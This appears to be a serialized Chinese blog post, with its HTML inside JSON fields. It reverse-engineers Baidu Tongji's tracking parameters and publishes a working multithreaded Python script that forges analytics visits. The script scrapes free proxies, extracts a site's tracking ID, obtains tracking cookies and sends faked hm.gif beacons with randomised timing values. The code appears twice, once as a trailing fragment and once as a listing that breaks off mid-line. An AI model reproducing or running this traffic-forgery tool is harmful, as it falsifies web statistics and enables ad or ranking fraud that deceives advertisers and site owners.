class=\"string\">'87'</span></div><div class=\"line\">                params[<span class=\"string\">'rnd'</span>]=str(random.randint(<span class=\"number\">0</span>,<span class=\"number\">2147483647</span>))</div><div class=\"line\">                params.pop(<span class=\"string\">'sn'</span>)    <span class=\"comment\"># 移除 sn</span></div><div class=\"line\">                params.pop(<span class=\"string\">'ct'</span>)    <span class=\"comment\"># 移除 ct</span></div><div class=\"line\">                params.pop(<span class=\"string\">'tt'</span>)    <span class=\"comment\"># 移除 tt</span></div><div class=\"line\">                ep=&#123;</div><div class=\"line\">                    <span class=\"string\">'netAll'</span>:random.randint(<span class=\"number\">5</span>,<span class=\"number\">500</span>),</div><div class=\"line\">                    <span class=\"string\">'netDns'</span>:<span class=\"number\">0</span>,</div><div class=\"line\">                    <span class=\"string\">'netTcp'</span>:<span class=\"number\">0</span>,</div><div class=\"line\">                    <span class=\"string\">'srv'</span>:random.randint(<span class=\"number\">5</span>,<span class=\"number\">200</span>),</div><div class=\"line\">                    <span class=\"string\">'dom'</span>:random.randint(<span class=\"number\">250</span>,<span class=\"number\">750</span>),</div><div class=\"line\">                    <span class=\"string\">'loadEvent'</span>:random.randint(<span class=\"number\">800</span>,<span class=\"number\">1500</span>),</div><div class=\"line\">                    <span class=\"string\">'qid'</span>:<span class=\"string\">\"\"</span>,</div><div class=\"line\">                    <span class=\"string\">'bdDom'</span>:<span class=\"number\">0</span>,</div><div class=\"line\">                    <span class=\"string\">'bdRun'</span>:<span class=\"number\">0</span>,</div><div class=\"line\">                    <span class=\"string\">'bdDef'</span>:<span class=\"number\">0</span></div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                ep= <span class=\"string\">'&#123;\"netAll\":'</span>+ str(random.randint(<span class=\"number\">5</span>,<span class=\"number\">500</span>)) + <span class=\"string\">',\"netDns\":0'</span> + <span class=\"string\">',\"netTcp\":0'</span> + <span class=\"string\">',\"srv\":'</span> + str(random.randint(<span class=\"number\">5</span>,<span class=\"number\">200</span>)) +   <span class=\"string\">',\"dom\":'</span> + str(random.randint(<span class=\"number\">250</span>,<span class=\"number\">750</span>))+<span class=\"string\">',\"loadEvent\":'</span> + str(random.randint(<span class=\"number\">800</span>,<span class=\"number\">1500</span>))+<span class=\"string\">',\"qid\":\"\",\"bdDom\":0,\"bdRun\":0,\"bdDef\":0&#125;'</span></div><div class=\"line\"></div><div class=\"line\">                params[<span class=\"string\">'ep'</span>]=str(ep)     <span class=\"comment\"># 顺序变乱，尚不清楚是否影响使用</span></div><div class=\"line\">                <span class=\"comment\"># 第二次提交数据</span></div><div class=\"line\">                r=s.get(<span class=\"string\">\"http://hm.baidu.com/hm.gif\"</span>,headers=headers,params=params,proxies=&#123;protocol:proxy&#125;,verify=<span class=\"keyword\">False</span>,timeout=<span class=\"number\">5</span>)</div><div class=\"line\">                logging.info(r.url)</div><div class=\"line\">                self.threadLock.acquire()</div><div class=\"line\">                self.counter = self.counter + <span class=\"number\">1</span></div><div class=\"line\">                print(<span class=\"string\">\"\\rSuccess %d times\"</span>%self.counter)</div><div class=\"line\">                self.threadLock.release()</div><div class=\"line\">            <span class=\"keyword\">except</span>:</div><div class=\"line\">                <span class=\"comment\">#print(\"Failed! Do again...\")</span></div><div class=\"line\">                print(<span class=\"string\">\".\"</span>,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">            <span class=\"keyword\">finally</span>:</div><div class=\"line\">                <span class=\"keyword\">pass</span>     </div><div class=\"line\"></div><div class=\"line\">            time.sleep(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    headCharPic=<span class=\"string\">\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   &lt; Author: Mr.Bingo &gt;\\n      //   \\ \\   ------------------ \\n     (|     | ) &lt;    oddboy.cn     &gt;\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"</span></div><div class=\"line\">    print(headCharPic)</div><div class=\"line\">    <span class=\"comment\"># Creating a parser</span></div><div class=\"line\">    parser=argparse.ArgumentParser(</div><div class=\"line\">        <span class=\"comment\">#prog=\"BingoBF\",</span></div><div class=\"line\">        usage=<span class=\"string\">\"%(prog)s [options] \"</span>,</div><div class=\"line\">        description=<span class=\"string\">'刷百度统计访问数据'</span>,</div><div class=\"line\">        epilog=<span class=\"string\">\"+---+\\n\"</span></div><div class=\"line\">        )</div><div class=\"line\">    parser = argparse.ArgumentParser()</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"-u\"</span>,dest=<span class=\"string\">\"url\"</span>,action=<span class=\"string\">\"store\"</span>,required=<span class=\"keyword\">True</span>,help=<span class=\"string\">\"目标URL，HM_ID从网页中提取\"</span>)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"--proxyList\"</span>,dest=<span class=\"string\">\"proxyList\"</span>,action=<span class=\"string\">\"store\"</span>,default=<span class=\"keyword\">None</span>,help=<span class=\"string\">\"代理地址列表文件，格式： http://127.0.0.1:8080 ; 如空，则自动从xicidaili.com/nn上爬取。\"</span>)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"-s\"</span>,dest=<span class=\"string\">\"source\"</span>,action=<span class=\"string\">\"store\"</span>,default=<span class=\"keyword\">None</span>,help=<span class=\"string\">\"流量来源地址\"</span>)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"-c\"</span>,dest=<span class=\"string\">\"count\"</span>,action=<span class=\"string\">\"store\"</span>,default=<span class=\"number\">10</span>, type=int , help=<span class=\"string\">\"访问次数 (目前只实现单一网页,单次访问统计),默认10次\"</span>)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"-t\"</span>,dest=<span class=\"string\">\"threads\"</span>,action=<span class=\"string\">\"store\"</span>,default=<span class=\"number\">1</span>,type=int,help=<span class=\"string\">\"线程数，默认为1\"</span>)</div><div class=\"line\"></div><div class=\"line\">    args=parser.parse_args()</div><div class=\"line\"></div><div class=\"line\">    proxy_obj=Proxyer(args.proxyList)   <span class=\"comment\"># 生成一个Proxyer对象</span></div><div class=\"line\">    cheater_obj = Cheater(proxy_obj,args.url,args.source,args.threads,args.count)   <span class=\"comment\"># 生成一个Cheater对象</span></div><div class=\"line\"></div><div class=\"line\">    cheater_obj.run_Threads()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>  花了两天时间，终于把百度统计的js代码大概看了看，并写了个刷流量的Python脚本。 </p>\n</blockquote>","more":"<h3 id=\"实现原理\"><a href=\"#实现原理\" class=\"headerlink\" title=\"实现原理\"></a>实现原理</h3><p>百度统计网站 <a href=\"https://tongji.baidu.com\">https://tongji.baidu.com</a></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;</div><div class=\"line\"><span class=\"keyword\">var</span> _hmt = _hmt || [];</div><div class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">var</span> hm = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"script\"</span>);</div><div class=\"line\">\thm.src = <span class=\"string\">\"https://hm.baidu.com/hm.js?789fd650fa0xxxxxxxxxxxx9d890b87f\"</span>;</div><div class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"script\"</span>)[<span class=\"number\">0</span>]; </div><div class=\"line\">\ts.parentNode.insertBefore(hm, s);</div><div class=\"line\">\t&#125;)();</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></div></pre></td></tr></table></figure>\n<ol>\n<li><p>在需要统计的页面加入上面的代码，引入hm.js脚本。</p>\n</li>\n<li><p>在获取该hm.js代码的同时，百度统计会往你的浏览器写入一个名字为“HMACCOUNT”的cookie，每一个cookie即为一个客户标识。（同IP不同用户的情况很常见，所以访问量不可能以IP为准）</p>\n</li>\n<li><p>hm.js脚本执行，获取一些浏览器/网页/访问来源等一系列信息，包括屏幕尺寸、颜色深度、flash版本、用户语言等。</p>\n</li>\n</ol>\n<h3 id=\"参数分析\"><a href=\"#参数分析\" class=\"headerlink\" title=\"参数分析\"></a>参数分析</h3><p>从js代码中可以得知，所有的参数包括“cc cf ci ck cl cm cp cu cw ds ep et fl ja ln lo lt nv rnd si st su v cv lv api sn ct u tt”。</p>\n<p>经过吐血分析，大致的作用如下，以及一些实际示例（由于直接张贴有些乱，所以就贴图了。）<br><img src=\"/2017/09/百度统计JS脚本分析-流量伪造脚本/image01.jpg\" alt=\"img\"></p>\n<h3 id=\"python脚本实现\"><a href=\"#python脚本实现\" class=\"headerlink\" title=\"python脚本实现\"></a>python脚本实现</h3><p>主要思路：</p>\n<ol>\n<li><p>访问目标url,获取标题和页面中的百度统计id。</p>\n</li>\n<li><p>从西刺代理获取免费代理。</p>\n</li>\n<li><p>访问hm.js获取cookie。</p>\n</li>\n<li><p>提交两次略有差异的GET请求到hm.gif</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div><div class=\"line\">224</div><div class=\"line\">225</div><div class=\"line\">226</div><div class=\"line\">227</div><div class=\"line\">228</div><div class=\"line\">229</div><div class=\"line\">230</div><div class=\"line\">231</div><div class=\"line\">232</div><div class=\"line\">233</div><div class=\"line\">234</div><div class=\"line\">235</div><div class=\"line\">236</div><div class=\"line\">237</div><div class=\"line\">238</div><div class=\"line\">239</div><div class=\"line\">240</div><div class=\"line\">241</div><div class=\"line\">242</div><div class=\"line\">243</div><div class=\"line\">244</div><div class=\"line\">245</div><div class=\"line\">246</div><div class=\"line\">247</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! /usr/bin/env python3</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> requests</div><div class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</div><div class=\"line\"><span class=\"keyword\">import</span> argparse</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> re</div><div class=\"line\"><span class=\"keyword\">import</span> queue</div><div class=\"line\"><span class=\"keyword\">import</span> threading</div><div class=\"line\"><span class=\"keyword\">import</span> time</div><div class=\"line\"><span class=\"keyword\">import</span> logging</div><div class=\"line\"><span class=\"keyword\">import</span> random</div><div class=\"line\"><span class=\"keyword\">from</span> requests.packages.urllib3.exceptions <span class=\"keyword\">import</span> InsecureRequestWarning</div><div class=\"line\">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</div><div class=\"line\"></div><div class=\"line\">logging.basicConfig(level=logging.WARNING)</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Proxyer</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,proxyListFile=None)</span>:</span></div><div class=\"line\">        self.proxyListFile = proxyListFile</div><div class=\"line\">        self.proxyList = queue.Queue()      <span class=\"comment\"># proxy队列</span></div><div class=\"line\">        self.xici_url=<span class=\"string\">'http://www.xicidaili.com/nn/'</span></div><div class=\"line\">        self.xici_pageid=<span class=\"number\">0</span>                  <span class=\"comment\"># http://www.xicidaili.com/nn/&#123;id&#125;</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">readFromFile</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">with</span> open(self.proxyListFile, <span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> f:</div><div class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f.readlines():</div><div class=\"line\">                self.proxyList.put(str.lower(line).strip(<span class=\"string\">\"\\n\"</span>))</div><div class=\"line\">        <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">readFrom_xicidaili</span><span class=\"params\">(self)</span>:</span>   </div><div class=\"line\">        self.xici_pageid = self.xici_pageid + <span class=\"number\">1</span> <span class=\"keyword\">if</span> self.xici_pageid&lt;<span class=\"number\">500</span> <span class=\"keyword\">else</span> <span class=\"number\">1</span>      <span class=\"comment\"># 只读取前500个页面中的代理。</span></div><div class=\"line\">        page_url = self.xici_url + str(self.xici_pageid) </div><div class=\"line\">        print(<span class=\"string\">\"Read Proxies From :: %s\"</span>%page_url)</div><div class=\"line\">        ipPool=[]</div><div class=\"line\">        headers=&#123;</div><div class=\"line\">        <span class=\"string\">'Connection'</span>: <span class=\"string\">'close'</span>,</div><div class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span>,</div><div class=\"line\">        <span class=\"string\">'Accept'</span>: <span class=\"string\">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</div><div class=\"line\">        <span class=\"string\">'Accept-Language'</span>: <span class=\"string\">'zh-CN,zh;q=0.8,en;q=0.6'</span>,</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"comment\"># Make a GET request and read the response</span></div><div class=\"line\">        req = requests.get(page_url,headers=headers)</div><div class=\"line\"></div><div class=\"line\">        html_str=req.text</div><div class=\"line\">        <span class=\"comment\"># the pattern(Regular expression) is depend on the response data from your url</span></div><div class=\"line\">        pattern = <span class=\"string\">r'\\s*&lt;tr[\\s\\S]*?&lt;td&gt;(((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d?))&lt;/td&gt;\\s*?&lt;td&gt;(\\d*?)&lt;/td&gt;[\\s\\S]*?&lt;a[\\s\\S]*?&gt;(.*?)&lt;/a&gt;[\\s\\S]*?&lt;td&gt;(HTTP|HTTPS)&lt;/td&gt;'</span></div><div class=\"line\">        regex = re.compile(pattern)</div><div class=\"line\">        s = regex.findall(html_str)</div><div class=\"line\">        <span class=\"comment\">#s = [('221.204.103.145', '103.', '103', '145', '9797', '山西太原', 'HTTP'), ...]</span></div><div class=\"line\">        <span class=\"keyword\">for</span> host <span class=\"keyword\">in</span> s:</div><div class=\"line\">            hostdict = (host[<span class=\"number\">0</span>],host[<span class=\"number\">4</span>],host[<span class=\"number\">5</span>],host[<span class=\"number\">-1</span>])</div><div class=\"line\">            ipPool.append(hostdict)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> ipPool:</div><div class=\"line\">            self.proxyList.put(str.lower(<span class=\"string\">'%s://%s:%s'</span>% (x[<span class=\"number\">3</span>], x[<span class=\"number\">0</span>],x[<span class=\"number\">1</span>])))</div><div class=\"line\">        <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getAProxy</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        logging.info(<span class=\"string\">\"tring get a proxy...\"</span>)</div><div class=\"line\">        proxy = <span class=\"string\">\"\"</span></div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\">            proxy = self.proxyList.get(timeout=<span class=\"number\">1</span>)</div><div class=\"line\">        <span class=\"keyword\">except</span>:</div><div class=\"line\">            <span class=\"keyword\">if</span> (self.proxyList.empty):</div><div class=\"line\">                <span class=\"keyword\">if</span> self.proxyListFile <span class=\"keyword\">is</span> <span class=\"keyword\">None</span> :</div><div class=\"line\">                    self.readFrom_xicidaili()</div><div class=\"line\">                <span class=\"keyword\">else</span>:</div><div class=\"line\">                    self.readFromFile()      <span class=\"comment\"># 读取一次用完后，再次读取。</span></div><div class=\"line\">            proxy = self.proxyList.get()</div><div class=\"line\">        <span class=\"keyword\">return</span> proxy</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cheater</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,proxy_obj,url,source,vistiThread,visitCount)</span>:</span></div><div class=\"line\">        self.proxyer=proxy_obj</div><div class=\"line\">        self.sourceUrl=source</div><div class=\"line\">        self.visitCount=visitCount</div><div class=\"line\">        self.vistiThread=vistiThread</div><div class=\"line\">        self.counter=<span class=\"number\">0</span>      <span class=\"comment\"># 已完成的访问数</span></div><div class=\"line\">        self.threadLock = threading.Lock()      <span class=\"comment\"># 用于计数器</span></div><div class=\"line\">        self.pageUrl=<span class=\"string\">\"\"</span></div><div class=\"line\">        self.pageTitle=<span class=\"string\">\"\"</span></div><div class=\"line\">        self.bdTongJiID=<span class=\"string\">\"\"</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\">            r = requests.get(url)</div><div class=\"line\">            self.pageUrl = r.url</div><div class=\"line\">            print(<span class=\"string\">\"当前页面URL :: \"</span>,self.pageUrl)</div><div class=\"line\">            </div><div class=\"line\">            soup = BeautifulSoup(r.text, <span class=\"string\">'lxml'</span>)</div><div class=\"line\">            html_str=soup.prettify()</div><div class=\"line\"></div><div class=\"line\">            self.pageTitle=soup.title.string</div><div class=\"line\"></div><div class=\"line\">            print(<span class=\"string\">\"当前页面标题 :: \"</span>, self.pageTitle)</div><div class=\"line\">        <span class=\"keyword\">except</span>:</div><div class=\"line\">            print(<span class=\"string\">\"目标网页读取失败！！！\"</span>)</div><div class=\"line\">            sys.exit()</div><div class=\"line\">            </div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\"></div><div class=\"line\">            self.bdTongJiID=re.search(<span class=\"string\">r'hm.src = \"https?\\:\\/\\/hm.baidu.com\\/hm.js\\?(\\w&#123;32&#125;)\";'</span>,html_str,re.I).group(<span class=\"number\">1</span>)   <span class=\"comment\"># 正则表达式提取32位字符串id</span></div><div class=\"line\">            print(<span class=\"string\">\"获得百度统计代码ID :: \"</span>,self.bdTongJiID)</div><div class=\"line\">            <span class=\"keyword\">if</span> len(self.bdTongJiID)!=<span class=\"number\">32</span> :</div><div class=\"line\">                print(<span class=\"string\">\"百度统计ID异常\"</span>)</div><div class=\"line\">                sys.exit()</div><div class=\"line\">        <span class=\"keyword\">except</span>:</div><div class=\"line\">            print(<span class=\"string\">\"目标网页未引用百度统计js代码\"</span>)</div><div class=\"line\">            sys.exit()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_Threads</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        thread_arr=[]       <span class=\"comment\"># 线程列表list</span></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.vistiThread):</div><div class=\"line\">            t = threading.Thread(target=self.doCheat)</div><div class=\"line\">            thread_arr.append(t)</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.vistiThread):</div><div class=\"line\">            thread_arr[i].start()</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.vistiThread):</div><div class=\"line\">            thread_arr[i].join()</div><div class=\"line\"></div><div class=\"line\">        print(<span class=\"string\">\"Job Finish!!!  %d \"</span>%self.counter)   </div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">doCheat</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">while</span> self.counter&lt;self.visitCount:  </div><div class=\"line\">            print(<span class=\"string\">\".\"</span>,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">            proxy=self.proxyer.getAProxy()</div><div class=\"line\">            <span class=\"keyword\">try</span>:</div><div class=\"line\">                proxy=re.match(<span class=\"string\">r'(https?\\:\\/\\/(\\d+\\.)&#123;3&#125;\\d+\\:\\d+)'</span>,proxy).group(<span class=\"number\">1</span>)  <span class=\"comment\"># 正则表达式校验proxy</span></div><div class=\"line\">            <span class=\"keyword\">except</span>:</div><div class=\"line\">                print(<span class=\"string\">\"proxy正则校验失败...\"</span>)</div><div class=\"line\">                <span class=\"keyword\">continue</span></div><div class=\"line\"></div><div class=\"line\">            protocol=proxy.split(<span class=\"string\">\"://\"</span>)[<span class=\"number\">0</span>]</div><div class=\"line\">            headers=&#123;</div><div class=\"line\">                    <span class=\"string\">'Connection'</span>: <span class=\"string\">'close'</span>,</div><div class=\"line\">                    <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span>,</div><div class=\"line\">                    <span class=\"string\">'Accept'</span>: <span class=\"string\">'*/*'</span>,</div><div class=\"line\">                    <span class=\"string\">'Accept-Language'</span>: <span class=\"string\">'zh-CN,zh;q=0.8,en;q=0.6'</span>,</div><div class=\"line\">                    <span class=\"string\">'Referer'</span>: self.pageUrl</div><div class=\"line\">            &#125;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">try</span>:</div><div class=\"line\">                s=<span class=\"string\">\"\"</span></div><div class=\"line\">                s=requests.session()</div><div class=\"line\">                <span class=\"comment\"># 访问hm.js?&#123;ID&#125;获取cookie</span></div><div class=\"line\">                s.get(<span class=\"string\">\"https://hm.baidu.com/hm.js?\"</span>+self.bdTongJiID,headers=headers,proxies=&#123;protocol:proxy&#125;,verify=<span class=\"keyword\">False</span>,timeout=<span class=\"number\">15</span>)</div><div class=\"line\">                <span class=\"comment\"># 直接访问1 | 站外跳入1</span></div><div class=\"line\">                params=&#123;</div><div class=\"line\">                        <span class=\"string\">'cc'</span>:<span class=\"string\">'0'</span>,</div><div class=\"line\">                        <span class=\"string\">'ck'</span>:<span class=\"string\">'1'</span>,</div><div class=\"line\">                        <span class=\"string\">'cl'</span>:<span class=\"string\">'24-bit'</span>,</div><div class=\"line\">                        <span class=\"string\">'ds'</span>:<span class=\"string\">'1280x800'</span>,</div><div class=\"line\">                        <span class=\"string\">'et'</span>:<span class=\"string\">'0'</span>,</div><div class=\"line\">                        <span class=\"string\">'fl'</span>:<span class=\"string\">'26'</span>,</div><div class=\"line\">                        <span class=\"string\">'ja'</span>:<span class=\"string\">'0'</span>,</div><div class=\"line\">                        <span class=\"string\">'ln'</span>:<span class=\"string\">'zh-cn'</span>,</div><div class=\"line\">                        <span class=\"string\">'lo'</span>:<span class=\"string\">'0'</span>,</div><div class=\"line\">                        <span class=\"string\">'lt'</span>:str(int(time.time())<span class=\"number\">-2</span>),     </div><div class=\"line\">                        <span class=\"string\">'nv'</span>:str( <span class=\"number\">0</span> <span class=\"keyword\">if</span> (self.sourceUrl <span class=\"keyword\">is</span> <span class=\"keyword\">None</span>) <span class=\"keyword\">else</span> <span class=\"number\">1</span>),</div><div class=\"line\">                        <span class=\"string\">'rnd'</span>:str(random.randint(<span class=\"number\">0</span>,<span class=\"number\">2147483647</span>)),</div><div class=\"line\">                        <span class=\"string\">'si'</span>:str(self.bdTongJiID),</div><div class=\"line\">                        <span class=\"string\">'st'</span>:str( <span class=\"number\">4</span> <span class=\"keyword\">if</span> (self.sourceUrl <span class=\"keyword\">is</span> <span class=\"keyword\">None</span>) <span class=\"keyword\">else</span> <span class=\"number\">1</span>),</div><div class=\"line\">                        <span class=\"comment\">#'su':str( self.sourceUrl if（self.sourceUrl is not None) else \"\" ),</span></div><div class=\"line\">                        <span 